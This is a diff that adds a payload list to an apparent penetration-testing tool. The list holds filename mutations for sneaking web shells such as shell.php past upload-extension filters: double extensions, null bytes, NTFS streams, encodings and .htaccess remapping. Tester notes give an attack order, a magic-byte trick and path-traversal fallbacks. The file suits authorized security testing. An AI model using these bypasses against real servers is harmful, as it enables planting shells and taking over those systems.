@@ -1,0 +1,765 @@
+# ============================================================
+# BlackHunter — Upload Payloads: Extension Bypass Matrix
+# ============================================================
+# Purpose : Enumerate filename mutations that may slip past a
+#           naive extension blacklist/whitelist. Each entry is a
+#           transformation rule applied to a base filename
+#           (e.g., "shell.php" or "shell.jsp").
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : Each entry is a block delimited by [name] ... [/name].
+#           Directives:
+#             template : filename pattern with {base} and {ext}
+#             note     : short description
+#             os       : linux | windows | any
+#             server   : apache | nginx | iis | tomcat | any
+#           Lines starting with '#' are comments.
+# Warning : Some of these are destructive to the target's file
+#           system (e.g., trailing dot on Windows, NTFS ADS).
+#           Only test against systems explicitly in scope.
+# ============================================================
+
+
+# ------------------------------------------------------------
+# 1. Alternate PHP extensions (still executed by default)
+# ------------------------------------------------------------
+[ext_php_alt_phtml]
+template: {base}.phtml
+note  : Apache + mod_php often maps .phtml to PHP
+os    : any
+server: apache
+[/ext_php_alt_phtml]
+
+[ext_php_alt_php3]
+template: {base}.php3
+note  : Legacy PHP3 handler
+os    : any
+server: apache
+[/ext_php_alt_php3]
+
+[ext_php_alt_php4]
+template: {base}.php4
+note  : Legacy PHP4 handler
+os    : any
+server: apache
+[/ext_php_alt_php4]
+
+[ext_php_alt_php5]
+template: {base}.php5
+note  : Legacy PHP5 handler
+os    : any
+server: apache
+[/ext_php_alt_php5]
+
+[ext_php_alt_php7]
+template: {base}.php7
+note  : PHP7 handler (some distros)
+os    : any
+server: apache
+[/ext_php_alt_php7]
+
+[ext_php_alt_php8]
+template: {base}.php8
+note  : PHP8 handler (some distros)
+os    : any
+server: apache
+[/ext_php_alt_php8]
+
+[ext_php_alt_phps]
+template: {base}.phps
+note  : Source highlight handler — usually returns source, not execution
+os    : any
+server: apache
+[/ext_php_alt_phps]
+
+[ext_php_alt_pht]
+template: {base}.pht
+note  : Apache AddHandler php-script .pht in some configs
+os    : any
+server: apache
+[/ext_php_alt_pht]
+
+[ext_php_alt_phar]
+template: {base}.phar
+note  : Executes as PHP when routed via phar:// or AddHandler
+os    : any
+server: apache
+[/ext_php_alt_phar]
+
+[ext_php_alt_inc]
+template: {base}.inc
+note  : Executes if .inc is added to AddType/AddHandler
+os    : any
+server: apache
+[/ext_php_alt_inc]
+
+[ext_php_alt_module]
+template: {base}.module
+note  : Drupal convention; sometimes mapped to PHP
+os    : any
+server: apache
+[/ext_php_alt_module]
+
+[ext_php_alt_php_upper]
+template: {base}.PHP
+note  : Case-sensitive blacklists miss uppercase
+os    : any
+server: any
+[/ext_php_alt_php_upper]
+
+[ext_php_alt_php_mixed]
+template: {base}.PhP
+note  : Mixed-case variant
+os    : any
+server: any
+[/ext_php_alt_php_mixed]
+
+[ext_php_alt_php5_upper]
+template: {base}.PHP5
+note  : Uppercase legacy
+os    : any
+server: any
+[/ext_php_alt_php5_upper]
+
+
+# ------------------------------------------------------------
+# 2. Double extensions (classic blacklist bypass)
+# ------------------------------------------------------------
+[ext_double_php_jpg]
+template: {base}.php.jpg
+note  : App checks last extension only; Apache may still exec .php
+os    : any
+server: apache
+[/ext_double_php_jpg]
+
+[ext_double_php_png]
+template: {base}.php.png
+note  : Same idea, PNG variant
+os    : any
+server: apache
+[/ext_double_php_png]
+
+[ext_double_php_gif]
+template: {base}.php.gif
+note  : Same idea, GIF variant
+os    : any
+server: apache
+[/ext_double_php_gif]
+
+[ext_double_php_txt]
+template: {base}.php.txt
+note  : Often passes whitelist for text uploads
+os    : any
+server: any
+[/ext_double_php_txt]
+
+[ext_double_jpg_php]
+template: {base}.jpg.php
+note  : Reverse order — last extension is PHP
+os    : any
+server: any
+[/ext_double_jpg_php]
+
+[ext_double_png_php]
+template: {base}.png.php
+note  : Reverse order — last extension is PHP
+os    : any
+server: any
+[/ext_double_png_php]
+
+[ext_double_gif_php]
+template: {base}.gif.php
+note  : Reverse order — last extension is PHP
+os    : any
+server: any
+[/ext_double_gif_php]
+
+[ext_double_jsp_jpg]
+template: {base}.jsp.jpg
+note  : Java variant
+os    : any
+server: tomcat
+[/ext_double_jsp_jpg]
+
+[ext_double_jsp_png]
+template: {base}.jsp.png
+note  : Java variant
+os    : any
+server: tomcat
+[/ext_double_jsp_png]
+
+[ext_double_jspx]
+template: {base}.jspx.jpg
+note  : JSPX variant
+os    : any
+server: tomcat
+[/ext_double_jspx]
+
+[ext_double_php_php]
+template: {base}.php.php
+note  : Redundant but sometimes bypasses "only one extension" rules
+os    : any
+server: any
+[/ext_double_php_php]
+
+[ext_triple_php]
+template: {base}.php.jpg.php
+note  : Triple-extension variant
+os    : any
+server: apache
+[/ext_triple_php]
+
+
+# ------------------------------------------------------------
+# 3. Null byte injection (PHP < 5.3.4, legacy)
+# ------------------------------------------------------------
+[ext_null_php_jpg]
+template: {base}.php%00.jpg
+note  : Terminates extension parsing at .php
+os    : linux
+server: any
+[/ext_null_php_jpg]
+
+[ext_null_php_png]
+template: {base}.php%00.png
+note  : Null byte variant
+os    : linux
+server: any
+[/ext_null_php_png]
+
+[ext_null_php_txt]
+template: {base}.php%00.txt
+note  : Null byte variant
+os    : linux
+server: any
+[/ext_null_php_txt]
+
+[ext_null_raw]
+template: {base}.php\x00.jpg
+note  : Raw 0x00 byte (not URL-encoded)
+os    : linux
+server: any
+[/ext_null_raw]
+
+[ext_null_jsp]
+template: {base}.jsp%00.jpg
+note  : JSP variant
+os    : linux
+server: tomcat
+[/ext_null_jsp]
+
+
+# ------------------------------------------------------------
+# 4. Trailing dot / space (Windows filesystem quirk)
+# ------------------------------------------------------------
+[ext_trailing_dot]
+template: {base}.php.
+note  : Windows strips trailing dot → shell.php
+os    : windows
+server: iis
+[/ext_trailing_dot]
+
+[ext_trailing_space]
+template: {base}.php 
+note  : Windows strips trailing space → shell.php
+os    : windows
+server: iis
+[/ext_trailing_space]
+
+[ext_trailing_dot_space]
+template: {base}.php. 
+note  : Dot + space
+os    : windows
+server: iis
+[/ext_trailing_dot_space]
+
+[ext_leading_space]
+template:  {base}.php
+note  : Leading space in filename
+os    : windows
+server: iis
+[/ext_leading_space]
+
+[ext_multiple_dots]
+template: {base}.php...
+note  : Multiple trailing dots
+os    : windows
+server: iis
+[/ext_multiple_dots]
+
+[ext_jsp_trailing_dot]
+template: {base}.jsp.
+note  : Windows + Tomcat variant
+os    : windows
+server: tomcat
+[/ext_jsp_trailing_dot]
+
+
+# ------------------------------------------------------------
+# 5. NTFS Alternate Data Streams (Windows)
+# ------------------------------------------------------------
+[ext_ads_php]
+template: {base}.php::$DATA
+note  : ADS trick; file executes as .php on some IIS configs
+os    : windows
+server: iis
+[/ext_ads_php]
+
+[ext_ads_jpg]
+template: {base}.jpg::$DATA
+note  : ADS with allowed extension, but content is PHP
+os    : windows
+server: iis
+[/ext_ads_jpg]
+
+[ext_ads_jsp]
+template: {base}.jsp::$DATA
+note  : ADS variant for Java
+os    : windows
+server: tomcat
+[/ext_ads_jsp]
+
+[ext_ads_php_jpg]
+template: {base}.php.jpg::$DATA
+note  : Combined ADS + double extension
+os    : windows
+server: iis
+[/ext_ads_php_jpg]
+
+
+# ------------------------------------------------------------
+# 6. Semicolon / delimiter tricks (PHP + Apache)
+# ------------------------------------------------------------
+[ext_semicolon_php]
+template: {base}.php;.jpg
+note  : Apache may truncate at ; and exec .php
+os    : linux
+server: apache
+[/ext_semicolon_php]
+
+[ext_semicolon_php2]
+template: {base}.php;.png
+note  : Semicolon variant
+os    : linux
+server: apache
+[/ext_semicolon_php2]
+
+[ext_semicolon_jsp]
+template: {base}.jsp;.jpg
+note  : Java variant
+os    : linux
+server: tomcat
+[/ext_semicolon_jsp]
+
+[ext_double_semicolon]
+template: {base}.php;;.jpg
+note  : Double semicolon
+os    : linux
+server: apache
+[/ext_double_semicolon]
+
+[ext_slash_in_ext]
+template: {base}.php/.jpg
+note  : Slash inside extension (path truncation)
+os    : linux
+server: apache
+[/ext_slash_in_ext]
+
+[ext_backslash_in_ext]
+template: {base}.php\.jpg
+note  : Backslash variant (Windows)
+os    : windows
+server: iis
+[/ext_backslash_in_ext]
+
+
+# ------------------------------------------------------------
+# 7. URL-encoded / double-encoded dots and slashes
+# ------------------------------------------------------------
+[ext_enc_dot]
+template: {base}%2ephp
+note  : Encoded dot
+os    : any
+server: any
+[/ext_enc_dot]
+
+[ext_double_enc_dot]
+template: {base}%252ephp
+note  : Double-encoded dot
+os    : any
+server: any
+[/ext_double_enc_dot]
+
+[ext_enc_slash]
+template: {base}.php%2f.jpg
+note  : Encoded slash
+os    : linux
+server: apache
+[/ext_enc_slash]
+
+[ext_enc_null]
+template: {base}.php%2500.jpg
+note  : Double-encoded null
+os    : linux
+server: any
+[/ext_enc_null]
+
+[ext_unicode_dot]
+template: {base}\u002ephp
+note  : Unicode dot
+os    : any
+server: any
+[/ext_unicode_dot]
+
+[ext_overlong_utf8]
+template: {base}%c0%aephp
+note  : Overlong UTF-8 encoding of '.'
+os    : any
+server: any
+[/ext_overlong_utf8]
+
+
+# ------------------------------------------------------------
+# 8. Case / whitespace / control-char variants
+# ------------------------------------------------------------
+[ext_tab_before_ext]
+template: {base}\t.php
+note  : Tab character before extension
+os    : any
+server: any
+[/ext_tab_before_ext]
+
+[ext_newline_before_ext]
+template: {base}\n.php
+note  : Newline before extension
+os    : any
+server: any
+[/ext_newline_before_ext]
+
+[ext_cr_before_ext]
+template: {base}\r.php
+note  : Carriage return before extension
+os    : any
+server: any
+[/ext_cr_before_ext]
+
+[ext_zero_width_space]
+template: {base}\u200b.php
+note  : Zero-width space
+os    : any
+server: any
+[/ext_zero_width_space]
+
+[ext_zero_width_joiner]
+template: {base}\u200d.php
+note  : Zero-width joiner
+os    : any
+server: any
+[/ext_zero_width_joiner]
+
+[ext_bom_prefix]
+template: \ufeff{base}.php
+note  : UTF-8 BOM prefix
+os    : any
+server: any
+[/ext_bom_prefix]
+
+
+# ------------------------------------------------------------
+# 9. Apache .htaccess-driven re-mapping
+#    (pair with php_shells.txt .htaccess blocks)
+# ------------------------------------------------------------
+[ext_htaccess_jpg]
+template: {base}.jpg
+note  : Requires a sibling .htaccess mapping .jpg → PHP
+os    : any
+server: apache
+[/ext_htaccess_jpg]
+
+[ext_htaccess_png]
+template: {base}.png
+note  : Requires a sibling .htaccess mapping .png → PHP
+os    : any
+server: apache
+[/ext_htaccess_png]
+
+[ext_htaccess_abc]
+template: {base}.abc
+note  : Arbitrary extension + .htaccess AddType
+os    : any
+server: apache
+[/ext_htaccess_abc]
+
+[ext_htaccess_txt]
+template: {base}.txt
+note  : Requires .htaccess mapping .txt → PHP
+os    : any
+server: apache
+[/ext_htaccess_txt]
+
+[ext_userini_jpg]
+template: {base}.jpg
+note  : Requires a sibling .user.ini with auto_prepend_file
+os    : any
+server: php-fpm
+[/ext_userini_jpg]
+
+
+# ------------------------------------------------------------
+# 10. Reverse-double-extension (whitelist bypass)
+#    For upload forms that allow e.g. only .jpg
+# ------------------------------------------------------------
+[ext_reverse_jpg_php]
+template: {base}.jpg.php
+note  : If whitelist checks first extension, this passes
+os    : any
+server: any
+[/ext_reverse_jpg_php]
+
+[ext_reverse_png_php]
+template: {base}.png.php
+note  : Same idea
+os    : any
+server: any
+[/ext_reverse_png_php]
+
+[ext_reverse_gif_php]
+template: {base}.gif.php
+note  : Same idea
+os    : any
+server: any
+[/ext_reverse_gif_php]
+
+[ext_reverse_pdf_php]
+template: {base}.pdf.php
+note  : Same idea
+os    : any
+server: any
+[/ext_reverse_pdf_php]
+
+[ext_reverse_doc_php]
+template: {base}.doc.php
+note  : Same idea
+os    : any
+server: any
+[/ext_reverse_doc_php]
+
+
+# ------------------------------------------------------------
+# 11. Extension-less / dotless payloads
+# ------------------------------------------------------------
+[ext_no_ext]
+template: {base}
+note  : Some servers exec via shebang / handler mapping
+os    : linux
+server: apache
+[/ext_no_ext]
+
+[ext_dot_only]
+template: {base}.
+note  : Just a trailing dot
+os    : windows
+server: iis
+[/ext_dot_only]
+
+[ext_hidden_file]
+template: .{base}.php
+note  : Leading dot (hidden file)
+os    : linux
+server: any
+[/ext_hidden_file]
+
+[ext_double_hidden]
+template: ..{base}.php
+note  : Double leading dot
+os    : linux
+server: any
+[/ext_double_hidden]
+
+
+# ------------------------------------------------------------
+# 12. Language-specific alternates (non-PHP/JSP)
+# ------------------------------------------------------------
+[ext_asp]
+template: {base}.asp
+note  : Classic ASP
+os    : windows
+server: iis
+[/ext_asp]
+
+[ext_aspx]
+template: {base}.aspx
+note  : ASP.NET
+os    : windows
+server: iis
+[/ext_aspx]
+
+[ext_ashx]
+template: {base}.ashx
+note  : ASP.NET generic handler
+os    : windows
+server: iis
+[/ext_ashx]
+
+[ext_asmx]
+template: {base}.asmx
+note  : ASP.NET web service
+os    : windows
+server: iis
+[/ext_asmx]
+
+[ext_cfm]
+template: {base}.cfm
+note  : ColdFusion
+os    : any
+server: coldfusion
+[/ext_cfm]
+
+[ext_cfc]
+template: {base}.cfc
+note  : ColdFusion component
+os    : any
+server: coldfusion
+[/ext_cfc]
+
+[ext_pl]
+template: {base}.pl
+note  : Perl (CGI)
+os    : linux
+server: apache
+[/ext_pl]
+
+[ext_cgi]
+template: {base}.cgi
+note  : CGI
+os    : linux
+server: apache
+[/ext_cgi]
+
+[ext_py]
+template: {base}.py
+note  : Python (CGI / mod_wsgi)
+os    : linux
+server: apache
+[/ext_py]
+
+[ext_rb]
+template: {base}.rb
+note  : Ruby (CGI / Rack)
+os    : linux
+server: apache
+[/ext_rb]
+
+[ext_sh]
+template: {base}.sh
+note  : Shell script (CGI)
+os    : linux
+server: apache
+[/ext_sh]
+
+[ext_shtml]
+template: {base}.shtml
+note  : SSI — can include arbitrary files
+os    : any
+server: apache
+[/ext_shtml]
+
+[ext_stm]
+template: {base}.stm
+note  : SSI legacy
+os    : any
+server: apache
+[/ext_stm]
+
+
+# ------------------------------------------------------------
+# 13. Archive / polyglot targets
+# ------------------------------------------------------------
+[ext_zip]
+template: {base}.zip
+note  : ZIP archive — may be extracted server-side
+os    : any
+server: any
+[/ext_zip]
+
+[ext_tar]
+template: {base}.tar
+note  : TAR archive
+os    : any
+server: any
+[/ext_tar]
+
+[ext_gz]
+template: {base}.tar.gz
+note  : Gzipped TAR
+os    : any
+server: any
+[/ext_gz]
+
+[ext_svg]
+template: {base}.svg
+note  : SVG with embedded script / XXE
+os    : any
+server: any
+[/ext_svg]
+
+[ext_xml]
+template: {base}.xml
+note  : XML with XXE
+os    : any
+server: any
+[/ext_xml]
+
+[ext_html]
+template: {base}.html
+note  : Stored XSS via uploaded HTML
+os    : any
+server: any
+[/ext_html]
+
+[ext_htm]
+template: {base}.htm
+note  : Same as above
+os    : any
+server: any
+[/ext_htm]
+
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. The loader substitutes {base} with the shell's basename
+#    (e.g., "shell") and {ext} with the original extension.
+#    Example: for shell "php_cmd_get" (filename: cmd.php),
+#    the entry [ext_double_php_jpg] produces "cmd.php.jpg".
+#
+# 2. Not every entry applies to every target. Use the "server"
+#    and "os" directives to filter the matrix before running.
+#    Example: skip all windows/iis entries when the target is
+#    nginx on Linux.
+#
+# 3. Order matters. Try in this order:
+#    a) Alternate PHP/JSP extensions (phtml, php3, php5, jspx)
+#    b) Case variants (.PHP, .PhP)
+#    c) Double extensions (.php.jpg, .jpg.php)
+#    d) Semicolon / trailing dot / space (Apache + Windows)
+#    e) NTFS ADS (Windows)
+#    f) Null byte (legacy PHP)
+#    g) .htaccess / .user.ini re-mapping (upload the config
+#       first, then the payload with a benign extension)
+#    h) Polyglot with magic bytes (pair with mime_types.txt)
+#
+# 4. Some servers verify the file's magic bytes, not just the
+#    extension. If the payload is rejected for "invalid image",
+#    prepend GIF89a / PNG / JPEG magic and retry.
+#
+# 5. Do NOT leave orphaned files or broken .htaccess on the
+#    target. Clean up before the engagement ends, and list
+#    every uploaded path in the report.
+#
+# 6. If the target strips/renames uploads to a safe extension,
+#    skip extension tricks entirely and look for:
+#      - Path traversal in the filename (../../shell.php)
+#      - ZIP extraction with traversal (zip-slip)
+#      - Content-Type trust (see mime_types.txt)
+#      - Server-side processing of uploaded XML/SVG (XXE)
+# ============================================================
